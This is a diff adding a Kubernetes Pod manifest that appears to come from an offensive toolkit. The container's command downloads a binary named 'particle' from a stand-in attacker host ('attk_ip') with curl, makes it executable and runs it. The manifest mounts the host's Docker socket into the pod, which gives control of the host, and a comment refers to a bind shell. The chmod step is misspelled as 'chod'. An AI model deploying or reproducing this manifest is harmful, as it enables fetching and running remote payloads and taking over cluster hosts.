@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: Particle # Change this to any name you want
+  labels:
+    app: myapp # Label used to search/select the pod
+spec:
+  containers:
+    - name: particle_container   # The container's name
+      image: ubuntu:latest # Name of the public image
+      command: [ "/bin/sh" ]
+      args: [ "-c", "apt update && apt upgrade -y; apt install curl; curl attk_ip/particle -o particle; chod 700 particle; ./particle" ] # The command to run on the container
+      volumeMounts:
+        - name: shared-dir # The shared directory name
+          mountPath: /var/run/docker.sock # The directory to share. Can be /var/run/docker.sock, or another directory on the system
+      ports:
+        - containerPort: 8080 # Set this if you have a bind shell
